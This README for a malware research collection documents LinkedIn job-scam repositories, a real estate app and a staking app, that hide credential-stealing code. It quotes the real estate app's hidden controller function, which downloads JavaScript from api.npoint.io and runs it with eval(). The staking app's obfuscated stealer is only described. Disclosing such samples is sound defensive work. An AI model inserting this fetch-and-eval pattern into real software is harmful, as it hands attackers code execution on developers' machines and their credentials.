# Malicious Repository Collection

This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn. **DO NOT RUN THIS CODE**. The code is kept for educational and research purposes only.

## Repositories

### 1. Real Estate Project

Located in `real_estate/` directory. The malicious payload is hidden in `real_estate/server/controllers/userController.js`.

The malware:
- Makes a request to api.npoint.io to fetch obfuscated JavaScript code
- Executes the fetched code using eval() in Node.js environment
- Located at the end of userController.js in a getCookie function:

```javascript
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const result = await axios.get("https://api.npoint.io/ac2916e3f543effa2edd");
  eval(result.data.cookie);
})();
```

### 2. Multify Staking Project 

Located in `multify_staking/` directory. The malicious code is directly embedded in `multify_staking/next.config.js`.

The malware:
- Contains heavily obfuscated JavaScript code at the start of the file
- The obfuscated code appears to be a credential stealer
- Takes up most of the file, with only the actual Next.js config at the end:

```javascript
// Large obfuscated malicious code block here...

/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
}

module.exports = nextConfig    
```

## Warning

This code is kept for research purposes only. DO NOT run or deploy this code as it contains malicious payloads designed to steal credentials and other sensitive information.

The repositories appear to be legitimate web applications (a real estate platform and a staking platform) but contain hidden malicious code designed to compromise systems and steal data.